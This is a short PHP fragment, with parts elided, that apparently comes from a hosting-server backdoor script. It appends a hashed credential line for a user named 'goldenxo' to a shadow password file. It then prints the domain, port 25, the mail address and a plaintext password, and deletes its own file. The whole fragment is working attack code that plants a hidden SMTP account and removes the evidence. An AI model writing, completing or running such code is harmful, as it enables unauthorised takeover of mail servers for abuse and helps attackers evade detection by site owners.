...
if (is_dir($cp)) {
	...
	$smtp = 'goldenxo:$6$cgUmg67Qwy5oCFGt$NqLoWzoe0zkRbVLvtQSVBopsgl/Lx4yPsaDGbZoth9x5YftC8dfCTys5jTYAjOWmLcnptEG515jxMRZLsXWNj/:18129::::::'."\n";
	...
	$fo2=fopen($shadow2,"a");
	fwrite($fo2,$smtp);
	echo "$domain|25|goldenxo@$domain|34ks/(hdsfla(0ksa\n";
}
unlink(__FILE__);
?>